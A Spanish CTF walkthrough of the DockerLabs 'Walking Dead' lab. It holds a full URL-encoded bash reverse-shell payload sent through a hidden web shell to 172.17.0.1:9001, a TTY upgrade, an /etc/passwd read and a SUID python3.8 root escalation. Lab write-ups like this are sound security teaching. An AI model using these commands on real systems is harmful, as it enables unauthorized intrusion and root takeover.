@@ -1,0 +1,89 @@
+I"�<p>Walking Dead (DockerLabs): Explotación de Web Shell oculta y escalada de privilegios mediante abuso de Python 3.8 con bit SUID.</p>
+
+<p>Como ya sabemos, comenzaremos con un escaneo a nuestro objetivo con un script que pueden encontrar en mi perfil. Este realiza un escaneo automatizado de puertos, servicios, versiones, escaneo de directorios web y nos entregará información importante en esta primera fase de reconocimiento.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/scaneo.png" alt="reconocimiento" /></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/scan2.png" alt="nikto" /></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/scan3.png" alt="escaneo de directorios" /></p>
+
+<p>Este objetivo tiene servicio ssh y web habilitado. Para acceder por el servicio ssh necesitamos almenos un usuario para acceder a él, es por esto que nos centraremos en el servicio web.</p>
+
+<p>Nuestro escaneo automatizado nos detectó una ruta hacia <strong>/hidden</strong> y un documento llamado <strong>backup.txt</strong>. Con esta información vamos a comprobar de que se tratan.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/backup.png" alt="img4" /></p>
+
+<p>solo un texto en pantalla..</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/hidden.png" alt="img5" /></p>
+
+<p>En este directorio tampoco tenemos algo.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/index.png" alt="img6" /></p>
+
+<p>En la página principal aparentemente no tenemos nada, pero.. al inspeccionar la página, podemos ver un link oculto.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/link.png" alt="vector de ataque" /></p>
+
+<p>Al acceder a este link no obtenemos nada (aparentemente)</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/shell.png" alt="vector de ataque" /></p>
+
+<p>En esto punto podemos asumir que estamos ante una <em>web</em> <em>shell</em>, pero por que?
+tenemos un archivo oculto (.) con un nombre quizás como pista (shell) en un directorio ocuto (/hidden)
+Antes de asumir las cosas, es mejor probarlas. Como ya vimos en otros laboratorios, podemos intentar RCE en el navegador para probar.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/id.png" alt="rce" /></p>
+
+<p>ya que podemos lanzar comandos desde el navegador, busquemos que shell tenemos disponible para lanzar una reverse shell y obtener una sesión por consola y buscar el método para elevar nuestros privilegios.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/python.png" alt="rce" /></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/bash.png" alt="rce shell" /></p>
+
+<p>Tenemos bash para realizar nuestra conexión.</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27</code></p>
+
+<p><em>Un error común al trabajar con DockerLabs es intentar que la máquina víctima se conecte a nuestra IP de la red local (192.168.x.x). Debido a que el contenedor vive en una red virtual aislada, solo tiene visibilidad de su propia subred. Por lo tanto, la Reverse Shell debe apuntar obligatoriamente a la IP de la interfaz docker0 (generalmente 172.17.0.1)”.</em></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/rv.png" alt="rce reverse shell" /></p>
+
+<p>ya con la conexión vamos a mejorar la shell</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>luego mandamos la shell a segundo plano con <strong>CTRL Z</strong></p>
+
+<p>y en nuestra shell ponemos <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code> ahora al presionar enter volveremos a la shell de la víctima
+con este mejoramiento ya no tendremos una shell “tonta” ahora podremos usar las flechas sin que salgan caracteres no deseados.</p>
+
+<p>Ya estamos dentro del servidor, pero tenemos un problema. nuestro usuario (www-data) tiene muy pocos privilegios. Es por esto que buscaremos pivotear a un usuario con más accesos.</p>
+
+<p>Vamnos a buscar usuarios válidos en el sistema. Miraremos quien tiene un directorio en /home. Esto nos dirá a quien podemos suplantar..</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat /etc/passwd | grep "/home"</code></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/cat.png" alt="lectura de usuarios en el sistema" /></p>
+
+<p>Tenemos dos usuarios.. <strong>rick</strong> y <strong>negan</strong></p>
+
+<p>Antes utilizaremos la vieja confiable.. Buscar el SUID (encontrado en los últimos laboratorios que hemos hecho)</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/priv.png" alt="escalada de privilegios SUID" /></p>
+
+<p>Tenemos un regalo del cielo.. <strong>python 3.8</strong>  , ya sabemos que podemos utilizar python con el SUID para lanzar una shell como root gracias a los permisos heredados.</p>
+
+<p>así que:</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'</code></p>
+
+<p>y no es magia.. es solo aprovechar una mala configuración.</p>
+
+<p>Los comandos para los permisos heredados pueden verlos en <strong>gtfobins</strong>, esta es la bliblia del hacker donde podemos encontrar mucha información valiosa y útil.</p>
+<blockquote>
+  <p>https://gtfobins.org/gtfobins/python/</p>
+</blockquote>
+
+:ET
